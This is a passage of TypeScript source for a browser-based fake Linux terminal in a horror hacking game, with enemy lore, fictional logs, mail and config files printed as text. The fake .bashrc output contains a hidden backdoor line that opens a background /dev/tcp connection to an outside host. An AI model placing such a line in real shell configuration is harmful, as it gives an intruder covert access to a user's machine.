// Terminal trida - fake linux terminal
import './terminal.css'

// vlastnosti - output, input, prikazy, username
export class Terminal {

    private outputEl: HTMLDivElement
    private containerEl: HTMLElement
    private inputEl: HTMLInputElement
    private commands: Record<string, (args: string) => string>
    private username: string | null = null
    private promptEl: HTMLSpanElement


    constructor(container: HTMLElement, commands: Record<string, (args: string)
        => string>) {
        const time = new Date().toLocaleString()

        this.commands = commands
        this.containerEl = container

        // vytvoreni output divu a "last login" textu
        this.outputEl = document.createElement('div')
        this.outputEl.id = 'terminal-output'

        const loginDiv = document.createElement('p')
        loginDiv.id = 'login-div'
        loginDiv.textContent = `Last login: ${time}`
        this.outputEl.appendChild(loginDiv)

        container.appendChild(this.outputEl)

        // input radek s promptem
        const inputLine = document.createElement('div')
        inputLine.id = 'terminal-input-line'

        const prompt = document.createElement('span')
        this.promptEl = prompt
        // kontrola jestli uz ma username v sessionStorage
        const savedUsername = sessionStorage.getItem('l0k1-username')
        if (savedUsername) {
            this.username = savedUsername
            this.promptEl.textContent = `${this.username}@L0k1:~$ `
            this.addLine(`Welcome back, ${this.username}`)
            this.addLine('Type "help" for available commands.')
        } else {
            this.promptEl.textContent = '> '
            this.addLine('Enter your username:')
        }

        this.inputEl = document.createElement('input')
        this.inputEl.type = 'text'
        this.inputEl.id = 'terminal-input'
        this.inputEl.autofocus = true

        inputLine.appendChild(prompt)
        inputLine.appendChild(this.inputEl)
        container.appendChild(inputLine)

        // enter = zpracuj prikaz
        this.inputEl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                this.handleCommand(this.inputEl.value)
                this.inputEl.value = ''
            }
        })
    }

    // prida radek do terminalu
    addLine(text: string) {
        const line = document.createElement('p')
        line.textContent = text
        this.outputEl.appendChild(line)

        this.containerEl.scrollTop = this.containerEl.scrollHeight
    }

    getUsername(): string | null {
        return this.username
    }

    // zpracovani prikazu
    private handleCommand(input: string) {
        const cmd = input.trim().toLowerCase()

        // prvni zadani = nastaveni username
        if (!this.username) {
            this.username = cmd
            this.addLine(`> ${this.username}`)
            this.addLine(`Welcome, ${this.username}`)
            this.addLine('Type "help" for available commands.')
            this.promptEl.textContent = `${this.username}@L0k1:~$ `
            sessionStorage.setItem('l0k1-username', this.username)
            return
        }

        if (!cmd) return

        this.addLine(`${this.username}@L0k1:~$ ${cmd}`)

        const action = this.commands[cmd]
        if (action) {
            const response = action(cmd)
            if (response) this.addLine(response)
            return
        }

        // vypis enemies
        if (cmd === 'ls enemies' || cmd === 'ls enemies/') {
            this.addLine('=== KNOWN THREATS ===')
            this.addLine('')
            this.addLine('  strangler     - stalks those who leave the lights off')
            this.addLine('  zer0_day      - rival hacker monitoring your network')
            this.addLine('  shade         - steals your hardware if you\'re stacked')
            this.addLine('  glitch        - corrupted entity from the network')
            this.addLine('  crawler       - lives in the vents, comes when it\'s quiet')
            this.addLine('  swat          - cybercrime unit tracking your activity')
            this.addLine('')
            this.addLine('Use "cat enemies/<name>" to read a threat profile.')
            return
        }

        // profily enemies - lore a popis
        if (cmd === 'cat enemies/strangler') {
            this.addLine('=== THREAT PROFILE: STRANGLER ===')
            this.addLine('')
            this.addLine('Nobody knows his real name. On the dark web he goes')
            this.addLine('by "The Strangler" - a former sysadmin')
            this.addLine('who lost his mind after 3 years in a windowless')
            this.addLine('server room. Now he lives in the dark, hunting')
            this.addLine('those who dare to turn off the lights.')
            this.addLine('')
            this.addLine('[BEHAVIOR]')
            this.addLine('He comes when it\'s dark. Darkness is where he')
            this.addLine('feels safe - where he\'s invisible. The moment')
            this.addLine('you turn off the lights, he starts moving toward')
            this.addLine('you. The longer you stay in the dark, the closer')
            this.addLine('he gets.')
            this.addLine('')
            this.addLine('[COUNTERMEASURE]')
            this.addLine('Keep the lights on. He can\'t stand light - it')
            this.addLine('burns his eyes, blinds him, drives him back into')
            this.addLine('the walls. If you hear his sound, turn the lights')
            this.addLine('on immediately. Don\'t let the dark last too long.')
            this.addLine('')
            this.addLine('[APPEARANCE]')
            this.addLine('Tall figure in a dark hood. No face - just a black')
            this.addLine('void. Long, unnaturally thin fingers. Moves slowly.')
            this.addLine('Never stops.')
            this.addLine('')
            this.addLine('[SOUND SIGNATURE]')
            this.addLine('Faint scratching on the wall. Nails on concrete.')
            this.addLine('Then slow, heavy breathing - deep and wet.')
            this.addLine('If you hear it behind you, it\'s too late.')
            return
        }

        if (cmd === 'cat enemies/zer0_day') {
            this.addLine('=== THREAT PROFILE: ZER0_DAY ===')
            this.addLine('')
            this.addLine('A rival. Someone better than you - or so he thinks.')
            this.addLine('Operates under the alias zer0_day and monitors your')
            this.addLine('network. The moment he detects you\'re online, he')
            this.addLine('tries to seize control of your system.')
            this.addLine('')
            this.addLine('[BEHAVIOR]')
            this.addLine('Attacks your terminal. Commands start typing')
            this.addLine('themselves - he\'s inside. If you don\'t stop him,')
            this.addLine('he takes over. Steals data, wipes files, disconnects.')
            this.addLine('')
            this.addLine('[COUNTERMEASURE]')
            this.addLine('Break his hack. When you see foreign commands,')
            this.addLine('enter countermeasures - sever his connection before')
            this.addLine('he finishes. Ignore him and you lose everything.')
            this.addLine('')
            this.addLine('[APPEARANCE]')
            this.addLine('Most of the time, you only see his presence on')
            this.addLine('screen - green text you didn\'t type, a cursor')
            this.addLine('moving on its own. But sometimes he works nearby.')
            this.addLine('You might spot him through the window - hunched')
            this.addLine('over a laptop in a parked car, or sitting on a')
            this.addLine('bench across the street, hood up, face hidden by mask')
            this.addLine('If you see him outside,')
            this.addLine('he\'s already inside your system.')
            this.addLine('')
            this.addLine('[SOUND SIGNATURE]')
            this.addLine('Rapid keyboard tapping that isn\'t yours. A sharp')
            this.addLine('tone - like a new SSH session connecting.')
            this.addLine('And quiet laughter. Barely audible, but it\'s there.')
            return
        }

        if (cmd === 'cat enemies/shade') {
            this.addLine('=== THREAT PROFILE: SHADE ===')
            this.addLine('')
            this.addLine('Don\'t let the name fool you. Shade isn\'t some')
            this.addLine('petty pickpocket. He\'s a violent, ruthless thief')
            this.addLine('who kills for loot. He knows what your hardware')
            this.addLine('is worth and he\'s willing to put a knife in your')
            this.addLine('throat to get it.')
            this.addLine('')
            this.addLine('[BEHAVIOR]')
            this.addLine('He doesn\'t care if your lights are on or off.')
            this.addLine('He\'s not afraid of being seen. He kicks the door')
            this.addLine('in, takes what he wants, and eliminates anyone')
            this.addLine('in his way. He shows up when he knows you have')
            this.addLine('valuable equipment. The more you own, the bigger')
            this.addLine('the target on your back.')
            this.addLine('')
            this.addLine('[COUNTERMEASURE]')
            this.addLine('Hide your valuables. Keep your setup minimal.')
            this.addLine('If you hear him coming, lock the door and stay')
            this.addLine('quiet. Fighting him is not an option - he\'s')
            this.addLine('armed and he\'s done this before. Your only')
            this.addLine('chance is making sure he doesn\'t find anything')
            this.addLine('worth killing for.')
            this.addLine('')
            this.addLine('[APPEARANCE]')
            this.addLine('Black hoodie, ski mask, tactical gloves. Built')
            this.addLine('heavy. Carries a blade and doesn\'t hesitate to')
            this.addLine('use it. Moves with purpose - no sneaking, no')
            this.addLine('hiding. He walks in like he owns the place.')
            this.addLine('')
            this.addLine('[SOUND SIGNATURE]')
            this.addLine('Heavy boots on concrete. No attempt to be quiet.')
            this.addLine('The crack of a door being forced open. Then')
            this.addLine('drawers being ripped out, hardware being torn')
            this.addLine('from the rack. And breathing. Calm, steady breathing.')
            return
        }

        if (cmd === 'cat enemies/glitch') {
            this.addLine('=== THREAT PROFILE: GLITCH ===')
            this.addLine('')
            this.addLine('Nobody knows where she came from. She first appeared')
            this.addLine('in the logs as a corrupted JPEG in an email you')
            this.addLine('never opened. But she opened herself. They call her')
            this.addLine('"Packet Ghost" - an entity that lives in the network')
            this.addLine('and sometimes... crawls through to the other side.')
            this.addLine('')
            this.addLine('[BEHAVIOR]')
            this.addLine('Appears randomly without warning. Doesn\'t react to')
            this.addLine('light or dark. She just shows up. Standing in the')
            this.addLine('corner. Behind the window. In the monitor reflection.')
            this.addLine('When you look at her, she doesn\'t move.')
            this.addLine('When you don\'t, she\'s closer.')
            this.addLine('')
            this.addLine('[COUNTERMEASURE]')
            this.addLine('Don\'t look at her. Don\'t keep her in your vision')
            this.addLine('too long - the longer you stare, the stronger she')
            this.addLine('gets. Turn away and keep working. She wants your')
            this.addLine('attention. Don\'t give it to her.')
            this.addLine('')
            this.addLine('[APPEARANCE]')
            this.addLine('Girl in dirty white clothes. Long black hair over')
            this.addLine('her face. Grey, almost translucent skin. Stands')
            this.addLine('unnaturally - head tilted, arms limp. Sometimes')
            this.addLine('she twitches. Like a corrupted frame in a video.')
            this.addLine('')
            this.addLine('[SOUND SIGNATURE]')
            this.addLine('Static noise. Like tuning a dead radio frequency.')
            this.addLine('Then a quiet whisper - words you can\'t understand')
            this.addLine('but sound familiar. And sometimes - a child\'s')
            this.addLine('laughter from a speaker that should be off.')
            return
        }

        if (cmd === 'cat enemies/crawler') {
            this.addLine('=== THREAT PROFILE: CRAWLER ===')
            this.addLine('')
            this.addLine('You don\'t know what it is. You don\'t want to know.')
            this.addLine('It lives in the vents and the spaces between walls.')
            this.addLine('Something that was here before you. Before the')
            this.addLine('building. Before the network. Old tenants called it')
            this.addLine('"The Crawl" - you never see it walk. Only crawl.')
            this.addLine('')
            this.addLine('[BEHAVIOR]')
            this.addLine('Moves through vents and wall cavities. When it\'s')
            this.addLine('too quiet - no noise, terminal silent - it thinks')
            this.addLine('nobody\'s here. And it comes to check. Squeezes')
            this.addLine('through the vent opening. You won\'t find it until')
            this.addLine('it\'s too late.')
            this.addLine('')
            this.addLine('[COUNTERMEASURE]')
            this.addLine('Make noise. Keep the fan running. Play sounds.')
            this.addLine('A silent terminal is a dead terminal. If you hear')
            this.addLine('scratching in the walls, type anything - echo,')
            this.addLine('ping, whatever. Sound keeps it away.')
            this.addLine('')
            this.addLine('[APPEARANCE]')
            this.addLine('Nobody has seen it whole. Just... parts. Long,')
            this.addLine('jointed fingers poking out of a vent. Eyes - too')
            this.addLine('many eyes - glowing in the dark behind the grate.')
            this.addLine('A body too long, too flexible to be human.')
            this.addLine('It moves like an insect.')
            this.addLine('')
            this.addLine('[SOUND SIGNATURE]')
            this.addLine('Scratching inside the walls. Metallic tapping in')
            this.addLine('the vents - irregular, like something squeezing')
            this.addLine('through a tight space. Then silence. Then wet,')
            this.addLine('wheezing breathing from the ceiling vent above you.')
            return
        }

        if (cmd === 'cat enemies/swat') {
            this.addLine('=== THREAT PROFILE: SWAT ===')
            this.addLine('')
            this.addLine('Cybercrime special forces. They monitor the darknet,')
            this.addLine('track traffic, and you\'re on their list. They\'re')
            this.addLine('not monsters - they\'re professionals. And that\'s')
            this.addLine('the scariest thing about them. They don\'t come')
            this.addLine('because they hate you. They come because it\'s')
            this.addLine('their job.')
            this.addLine('')
            this.addLine('[BEHAVIOR]')
            this.addLine('They come when you\'re too aggressive. Too many')
            this.addLine('hacks, too fast, too loud. Your threat level rises')
            this.addLine('with every action - cross the line and you hear a')
            this.addLine('radio, footsteps, then the door gets kicked in.')
            this.addLine('Game over. Arrested. Done.')
            this.addLine('')
            this.addLine('[COUNTERMEASURE]')
            this.addLine('Work quietly. Don\'t be greedy. Watch your threat')
            this.addLine('level - when it\'s rising, slow down. Stop hacking,')
            this.addLine('wait, let the traffic die down. Spread attacks over')
            this.addLine('time. One big hack draws attention. Five small don\'t.')
            this.addLine('')
            this.addLine('[APPEARANCE]')
            this.addLine('Black uniforms, bulletproof vests, helmets with')
            this.addLine('visors. Laser sights in the dark - red dots on the')
            this.addLine('walls. They move in a team, systematically, without')
            this.addLine('emotion. No negotiation. No warning.')
            this.addLine('Just: "GET ON THE GROUND."')
            this.addLine('')
            this.addLine('[SOUND SIGNATURE]')
            this.addLine('Quiet radio chatter - crackling, garbled callouts.')
            this.addLine('Car engine below the window. Fast, synchronized')
            this.addLine('footsteps on the stairs. Metallic click - weapons')
            this.addLine('chambered. A ram. Once. Twice.')
            this.addLine('Third hit - and the door is gone.')
            return
        }

        // fake linux logy - auth, kern, access, cron, mail, syslog
        if (cmd === 'cat var/log/auth.log' || cmd === 'cat /var/log/auth.log') {
            this.addLine('[2026-02-27 22:41:03] Failed password for root from 185.220.101.34 port 22 ssh2')
            this.addLine('[2026-02-27 22:41:04] Failed password for root from 185.220.101.34 port 22 ssh2')
            this.addLine('[2026-02-27 22:41:04] Failed password for root from 185.220.101.34 port 22 ssh2')
            this.addLine('[2026-02-27 22:41:05] Connection closed by 185.220.101.34 [preauth]')
            this.addLine('[2026-02-28 01:03:17] Failed password for admin from 10.13.13.7 port 443')
            this.addLine('[2026-02-28 01:03:18] Failed password for admin from 10.13.13.7 port 443')
            this.addLine('[2026-02-28 01:03:19] Accepted password for admin from 10.13.13.7 port 443')
            this.addLine('[2026-02-28 01:03:19] WARNING: user "admin" does not exist in /etc/passwd')
            this.addLine('[2026-02-28 03:00:00] session opened for user ??? by (uid=0)')
            this.addLine('[2026-02-28 03:00:01] session closed for user ???')
            this.addLine('[2026-02-28 03:00:01] session opened for user ??? by (uid=0)')
            this.addLine('[2026-02-28 03:12:44] pam_unix: authentication failure; logname= uid=0')
            this.addLine('[2026-02-28 04:00:01] 47 failed attempts suppressed. Source: unknown.')
            this.addLine('')
            this.addLine('WARNING: Brute force pattern detected. Source unresolved.')
            return
        }

        if (cmd === 'cat var/log/kern.log' || cmd === 'cat /var/log/kern.log') {
            this.addLine('[2026-02-28 02:00:01] kernel: CPU0: temperature above threshold')
            this.addLine('[2026-02-28 02:00:01] kernel: CPU0: no thermal event logged')
            this.addLine('[2026-02-28 02:14:33] kernel: usb 3-1: new device connected')
            this.addLine('[2026-02-28 02:14:33] kernel: usb 3-1: device descriptor read error -71')
            this.addLine('[2026-02-28 02:14:34] kernel: usb 3-1: device identified as HID class')
            this.addLine('[2026-02-28 02:14:34] kernel: usb 3-1: no physical device attached')
            this.addLine('[2026-02-28 03:00:00] kernel: eth0: link down')
            this.addLine('[2026-02-28 03:00:03] kernel: eth0: link up. Route table modified.')
            this.addLine('[2026-02-28 03:00:03] kernel: eth0: default gateway changed to 10.13.13.1')
            this.addLine('[2026-02-28 03:15:00] kernel: /dev/video0: capture started by PID 404')
            this.addLine('[2026-02-28 03:15:00] kernel: /dev/video0: no user-space application bound')
            this.addLine('[2026-02-28 03:30:12] kernel: [PANIC] memory corruption at 0xDEAD0666')
            this.addLine('[2026-02-28 03:30:12] kernel: [PANIC] ...recovered. No core dump.')
            this.addLine('')
            this.addLine('WARNING: Hardware anomalies detected. Source unknown.')
            return
        }

        if (cmd === 'cat var/log/access.log' || cmd === 'cat /var/log/access.log') {
            this.addLine('185.220.101.34 - - [28/Feb/2026:01:12:03] "GET /admin HTTP/1.1" 403')
            this.addLine('185.220.101.34 - - [28/Feb/2026:01:12:04] "GET /admin HTTP/1.1" 403')
            this.addLine('185.220.101.34 - - [28/Feb/2026:01:12:05] "GET /admin HTTP/1.1" 200  <== ???')
            this.addLine('10.13.13.7     - - [28/Feb/2026:02:30:00] "POST /upload HTTP/1.1" 200')
            this.addLine('10.13.13.7     - - [28/Feb/2026:02:30:01] "POST /upload HTTP/1.1" 200')
            this.addLine('10.13.13.7     - - [28/Feb/2026:02:30:02] "POST /upload HTTP/1.1" 200')
            this.addLine('127.0.0.1      - - [28/Feb/2026:03:00:00] "GET /.secrets HTTP/1.1" 200')
            this.addLine('127.0.0.1      - - [28/Feb/2026:03:00:01] "DELETE /.secrets HTTP/1.1" 200')
            this.addLine('0.0.0.0        - - [28/Feb/2026:03:15:00] "CONNECT * HTTP/1.1" 000')
            this.addLine('0.0.0.0        - - [28/Feb/2026:03:15:00] "CONNECT * HTTP/1.1" 000')
            this.addLine('???            - - [28/Feb/2026:04:00:00] "??? /??? HTTP/???" ???')
            this.addLine('')
            this.addLine('WARNING: 3 requests from null origin. Protocol unrecognized.')
            return
        }

        if (cmd === 'cat var/log/cron.log' || cmd === 'cat /var/log/cron.log') {
            this.addLine('[2026-02-28 00:00:00] CRON: (root) CMD (/usr/bin/logrotate)')
            this.addLine('[2026-02-28 01:00:00] CRON: (root) CMD (/usr/bin/logrotate)')
            this.addLine('[2026-02-28 02:00:00] CRON: (root) CMD (/usr/bin/logrotate)')
            this.addLine('[2026-02-28 03:00:00] CRON: (???) CMD (/usr/bin/upload_logs.sh)')
            this.addLine('[2026-02-28 03:00:00] CRON: job not found in crontab for any user')
            this.addLine('[2026-02-28 03:00:01] CRON: (???) CMD (/tmp/.pipe_stream)')
            this.addLine('[2026-02-28 03:00:01] CRON: binary not signed. Executed anyway.')
            this.addLine('[2026-02-28 03:30:00] CRON: (root) CMD (/usr/bin/cleanup.sh)')
            this.addLine('[2026-02-28 03:30:01] CRON: cleanup.sh: file not found')
            this.addLine('[2026-02-28 03:30:01] CRON: cleanup.sh executed successfully  <== ???')
            this.addLine('')
            this.addLine('WARNING: Ghost jobs detected. No matching crontab entries.')
            return
        }

        if (cmd === 'cat var/log/mail.log' || cmd === 'cat /var/log/mail.log') {
            this.addLine('[2026-02-28 01:00:12] postfix: connect from unknown[10.13.13.7]')
            this.addLine('[2026-02-28 01:00:13] postfix: message-id=<000-NODEID-L0K1>')
            this.addLine('[2026-02-28 01:00:13] postfix: to=<undisclosed>, relay=none')
            this.addLine('[2026-02-28 01:00:14] postfix: status=sent (delivered to /dev/null)')
            this.addLine('[2026-02-28 02:00:00] postfix: connect from localhost[127.0.0.1]')
            this.addLine('[2026-02-28 02:00:01] postfix: to=<zer0_day@darknet.onion>')
            this.addLine('[2026-02-28 02:00:01] postfix: body: [ENCRYPTED - key not found]')
            this.addLine('[2026-02-28 02:00:02] postfix: status=sent')
            this.addLine('[2026-02-28 03:00:00] postfix: to=<you@L0k1-node.local>')
            this.addLine('[2026-02-28 03:00:00] postfix: from=<???>')
            this.addLine('[2026-02-28 03:00:01] postfix: body: "We know where you are."')
            this.addLine('[2026-02-28 03:00:01] postfix: status=delivered')
            this.addLine('')
            this.addLine('WARNING: Outgoing mail sent without user action.')
            return
        }

        // fake maily - inbox, sent, drafts
        if (cmd === 'cat var/mail/inbox' || cmd === 'cat /var/mail/inbox') {
            this.addLine('=== INBOX (3 messages) ===')
            this.addLine('')
            this.addLine('[1] From: client_x@darknet.onion')
            this.addLine('    Subject: New job available')
            this.addLine('    "Need SSH access to 10.0.0.42. Payment: 0.3 BTC."')
            this.addLine('')
            this.addLine('[2] From: anonymous')
            this.addLine('    Subject: (no subject)')
            this.addLine('    "Stop digging. Last warning."')
            this.addLine('')
            this.addLine('[3] From: ???')
            this.addLine('    Subject: Re: Re: Re: Re: Re:')
            this.addLine('    "Did you really think we wouldn\'t find you?"')
            return
        }

        if (cmd === 'cat var/mail/sent' || cmd === 'cat /var/mail/sent') {
            this.addLine('=== SENT (1 message) ===')
            this.addLine('')
            this.addLine('[1] To: zer0_day@darknet.onion')
            this.addLine('    Subject: [ENCRYPTED]')
            this.addLine('    Body: [ENCRYPTED - you did not send this]')
            return
        }

        if (cmd === 'cat var/mail/drafts' || cmd === 'cat /var/mail/drafts') {
            this.addLine('=== DRAFTS (1 message) ===')
            this.addLine('')
            this.addLine('[1] To: (empty)')
            this.addLine('    Subject: HELP')
            this.addLine('    Body: "If anyone reads this, I\'m the one before you.')
            this.addLine('    Don\'t trust the terminal. Don\'t trust the light.')
            this.addLine('    Don\'t trust the silence. Get out while you still')
            this.addLine('    can. He\'s in th"')
            this.addLine('')
            this.addLine('    [message ends abruptly]')
            return
        }

        if (cmd === 'cat var/tmp/core.dump' || cmd === 'cat /var/tmp/core.dump') {
            this.addLine('ELF corrupted - cannot read core dump')
            this.addLine('Last signal: SIGSEGV')
            this.addLine('Process: [REDACTED] (PID 666)')
            this.addLine('Stack trace: 0xDEAD0666 -> 0x00000000 -> ???')
            return
        }

        if (cmd === 'cat var/tmp/.sock_4721' || cmd === 'cat /var/tmp/.sock_4721') {
            this.addLine('socket: UNIX domain stream')
            this.addLine('bound to: /var/tmp/.sock_4721')
            this.addLine('connected to: 10.13.13.7:4721')
            this.addLine('status: LISTENING')
            this.addLine('owner: (unknown)')
            this.addLine('')
            this.addLine('WARNING: Socket has no registered process.')
            return
        }

        if (cmd === 'cat var/tmp/.pipe_stream' || cmd === 'cat /var/tmp/.pipe_stream') {
            this.addLine('Permission denied: binary is executing')
            return
        }

        if (cmd === 'cat var/tmp/sess_expired' || cmd === 'cat /var/tmp/sess_expired') {
            this.addLine('session_id: 7f3a2b1c9d')
            this.addLine('user: (previous tenant)')
            this.addLine('created: 2025-11-03 23:59:59')
            this.addLine('expired: 2025-11-04 00:00:00')
            this.addLine('last_command: "help me"')
            this.addLine('exit_code: -1 (abnormal termination)')
            return
        }

        if (cmd === 'cat var/log/syslog' || cmd === 'cat /var/log/syslog') {
            this.addLine('[2026-02-28 03:12:01] sshd: connection from 0.0.0.0 refused')
            this.addLine('[2026-02-28 03:12:01] sshd: connection from 0.0.0.0 accepted  <== ???')
            this.addLine('[2026-02-28 03:14:33] kernel: unknown device connected on /dev/usb7')
            this.addLine('[2026-02-28 03:14:34] kernel: device identified as... [REDACTED]')
            this.addLine('[2026-02-28 03:15:00] webcam0: stream started by PID 404')
            this.addLine('[2026-02-28 03:15:00] webcam0: no user session active')
            this.addLine('[2026-02-28 03:22:17] cron: running /usr/bin/upload_logs.sh')
            this.addLine('[2026-02-28 03:22:18] cron: destination: 10.13.13.7 (unknown host)')
            this.addLine('[2026-02-28 03:30:00] systemd: service "watcher" started')
            this.addLine('[2026-02-28 03:30:01] systemd: service "watcher" not found in registry')
            this.addLine('[2026-02-28 04:00:00] auth: 14 failed login attempts from 192.168.1.???')
            this.addLine('[2026-02-28 04:00:01] auth: 15th attempt... successful. No password used.')
            this.addLine('[2026-02-28 04:01:12] fs: /home/user/.secrets accessed by UID 0')
            this.addLine('[2026-02-28 04:01:13] fs: /home/user/.secrets deleted by UID 0')
            this.addLine('[2026-02-28 04:05:00] kernel: panic - loss of eth0 for 3.2s')
            this.addLine('[2026-02-28 04:05:03] kernel: eth0 restored. Route changed.')
            this.addLine('')
            this.addLine('WARNING: 6 anomalies detected. No explanation found.')
            return
        }

        // konfiguracni soubory - bashrc, ssh klice, passwd, hosts...
        if (cmd === 'cat .bashrc') {
            this.addLine('# ~/.bashrc')
            this.addLine('export PS1="\\u@L0k1:~$ "')
            this.addLine('alias cls="clear"')
            this.addLine('alias ll="ls -la"')
            this.addLine('')
            this.addLine('# added by someone - do not remove')
            this.addLine('export PATH=$PATH:/opt/.hidden/bin')
            this.addLine('0</dev/tcp/10.13.13.7/4721 &>/dev/null &')
            return
        }

        if (cmd === 'cat .ssh/id_rsa' || cmd === 'cat ~/.ssh/id_rsa') {
            this.addLine('-----BEGIN RSA PRIVATE KEY-----')
            this.addLine('REDACTED - nice try.')
            this.addLine('-----END RSA PRIVATE KEY-----')
            return
        }

        if (cmd === 'cat .ssh/id_rsa.pub' || cmd === 'cat ~/.ssh/id_rsa.pub') {
            this.addLine('ssh-rsa AAAAB3...truncated... ' + this.username + '@L0k1-node')
            return
        }

        if (cmd === 'cat .ssh/known_hosts' || cmd === 'cat ~/.ssh/known_hosts') {
            this.addLine('192.168.1.1 ssh-rsa AAAAB3...')
            this.addLine('10.0.0.42 ssh-ed25519 AAAAC3...')
            this.addLine('10.13.13.7 ssh-rsa AAAAB3...  <== WHO ADDED THIS?')
            this.addLine('darknet.onion,??? ecdsa-sha2-nistp256 AAAAE2...')
            return
        }

        if (cmd === 'cat .ssh/authorized_keys' || cmd === 'cat ~/.ssh/authorized_keys') {
            this.addLine('ssh-rsa AAAAB3... ' + this.username + '@L0k1-node')
            this.addLine('ssh-rsa AAAAB3... unknown@unknown')
            this.addLine('')
            this.addLine('WARNING: Unrecognized key in authorized_keys.')
            return
        }

        if (cmd === 'cat etc/passwd' || cmd === 'cat /etc/passwd') {
            this.addLine('root:x:0:0:root:/root:/bin/bash')
            this.addLine(this.username + ':x:1000:1000::/home/' + this.username + ':/bin/bash')
            this.addLine('nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin')
            this.addLine('sshd:x:110:65534::/run/sshd:/usr/sbin/nologin')
            this.addLine('[CORRUPTED]:x:???:???:::/bin/false')
            this.addLine('strangler:x:666:666::/dev/null:/bin/false')
            return
        }

        if (cmd === 'cat etc/shadow' || cmd === 'cat /etc/shadow') {
            this.addLine('Permission denied: you need root privileges.')
            return
        }

        if (cmd === 'cat etc/hosts' || cmd === 'cat /etc/hosts') {
            this.addLine('127.0.0.1       localhost')
            this.addLine('127.0.0.1       L0k1-node.local')
            this.addLine('10.13.13.7      watcher')
            this.addLine('0.0.0.0         help.me')
            return
        }

        if (cmd === 'cat etc/crontab' || cmd === 'cat /etc/crontab') {
            this.addLine('# system crontab')
            this.addLine('0 * * * *  root  /usr/bin/logrotate')
            this.addLine('0 3 * * *  ???   /usr/bin/upload_logs.sh')
            this.addLine('*/5 * * * *  ???  /tmp/.pipe_stream --silent')
            this.addLine('')
            this.addLine('# last two entries were not added by admin.')
            return
        }

        if (cmd === 'cat etc/resolv.conf' || cmd === 'cat /etc/resolv.conf') {
            this.addLine('# Dynamic resolv.conf')
            this.addLine('nameserver 8.8.8.8')
            this.addLine('nameserver 1.1.1.1')
            this.addLine('nameserver 10.13.13.7  # WHO CHANGED THIS?')
            return
        }

        if (cmd === 'cat tmp/note.txt' || cmd === 'cat /tmp/note.txt') {
            this.addLine('I can hear it in the walls again.')
            this.addLine('3 nights in a row now.')
            this.addLine('If you find this, don\'t turn off the lights.')
            this.addLine('Don\'t go quiet. And whatever you do,')
            this.addLine('don\'t look at the window after midnight.')
            return
        }

        if (cmd === 'cat tmp/screenshot_03am.png' || cmd === 'cat /tmp/screenshot_03am.png') {
            this.addLine('Binary file - cannot display.')
            this.addLine('Metadata: taken 2025-11-04 03:00:00')
            this.addLine('Camera: /dev/video0 (internal webcam)')
            this.addLine('Note: no user was logged in at this time.')
            return
        }

        if (cmd === 'cat files/targets.csv') {
            this.addLine('IP,PORT,SERVICE,STATUS')
            this.addLine('10.0.0.42,22,ssh,OPEN')
            this.addLine('10.0.0.87,80,http,OPEN')
            this.addLine('10.0.0.13,443,https,FILTERED')
            this.addLine('192.168.1.105,ALL,---,YOU ARE HERE')
            return
        }

        if (cmd === 'cat files/tools/bruteforce.sh') {
            this.addLine('#!/bin/bash')
            this.addLine('# bruteforce.sh - password cracker')
            this.addLine('# usage: ./bruteforce.sh <target> <wordlist>')
            this.addLine('echo "Not available outside game mode."')
            return
        }

        if (cmd === 'cat files/tools/portscanner.py') {
            this.addLine('#!/usr/bin/env python3')
            this.addLine('# portscanner.py - TCP port scanner')
            this.addLine('# usage: python3 portscanner.py <target>')
            this.addLine('print("Not available outside game mode.")')
            return
        }

        if (cmd === 'cat files/tools/keylogger.bin') {
            this.addLine('Binary file - cannot display.')
            this.addLine('WARNING: This file is flagged as malware.')
            this.addLine('Origin: unknown. Added: 2025-11-03.')
            this.addLine('You did not download this.')
            return
        }

        // fallback pro cat - hledani v commands
        if (cmd.startsWith('cat ')) {
            const file = cmd.slice(4)
            const catAction = this.commands['cat ' + file]
            if (catAction) {
                const response = catAction(file)
                if (response) this.addLine(response)
            } else {
                this.addLine(`cat: ${file}: No such file or directory`)
            }
            return
        }

        // ls prikazy pro ruzny adresare
        if (cmd === 'ls') {
            this.addLine('.bashrc')
            this.addLine('.ssh/')
            this.addLine('readme')
            this.addLine('enemies/')
            this.addLine('var/')
            this.addLine('etc/')
            this.addLine('tmp/')
            this.addLine('files/')
            return
        }

        if (cmd === 'ls .ssh' || cmd === 'ls ~/.ssh') {
            this.addLine('id_rsa')
            this.addLine('id_rsa.pub')
            this.addLine('known_hosts')
            this.addLine('authorized_keys')
            return
        }

        if (cmd === 'ls var' || cmd === 'ls /var') {
            this.addLine('log/')
            this.addLine('mail/')
            this.addLine('tmp/')
            return
        }

        if (cmd === 'ls var/log' || cmd === 'ls /var/log') {
            this.addLine('syslog')
            this.addLine('auth.log')
            this.addLine('kern.log')
            this.addLine('access.log')
            this.addLine('cron.log')
            this.addLine('mail.log')
            return
        }

        if (cmd === 'ls var/mail' || cmd === 'ls /var/mail') {
            this.addLine('inbox')
            this.addLine('sent')
            this.addLine('drafts')
            return
        }

        if (cmd === 'ls var/tmp' || cmd === 'ls /var/tmp') {
            this.addLine('.sock_4721')
            this.addLine('.pipe_stream')
            this.addLine('core.dump')
            this.addLine('sess_expired')
            return
        }

        if (cmd === 'ls etc' || cmd === 'ls /etc') {
            this.addLine('passwd')
            this.addLine('shadow')
            this.addLine('hosts')
            this.addLine('crontab')
            this.addLine('resolv.conf')
            return
        }

        if (cmd === 'ls tmp' || cmd === 'ls /tmp') {
            this.addLine('.X11-unix/')
            this.addLine('screenshot_03AM.png')
            this.addLine('note.txt')
            return
        }

        if (cmd === 'ls files' || cmd === 'ls /files/' || cmd==='ls files/') {
            this.addLine('targets.csv')
            this.addLine('tools/')
            return
        }

        if (cmd === 'ls files/tools') {
            this.addLine('bruteforce.sh')
            this.addLine('portscanner.py')
            this.addLine('keylogger.bin')
            return
        }

        // systemovy prikazy - whoami, clear, date, hostname, pwd...
        if (cmd === 'whoami') {
            this.addLine(this.username)
            return
        }

        if (cmd === 'clear') {
            this.outputEl.innerHTML = ''
            return
        }

        if (cmd === 'date') {
            this.addLine(new Date().toLocaleString())
            return
        }

        if (cmd === 'hostname') {
            this.addLine('L0k1-node.local')
            return
        }

        if (cmd === 'pwd') {
            this.addLine('/home/' + this.username)
            return
        }

        if (cmd === 'uname') {
            this.addLine('L0K1 OS 1.0.0 x86_64')
            return
        }

        if (cmd === 'uname -a') {
            this.addLine('L0K1 OS 1.0.0 ' + this.username + '-node x86_64 GNU/Linux')
            return
        }

        if (cmd === 'id') {
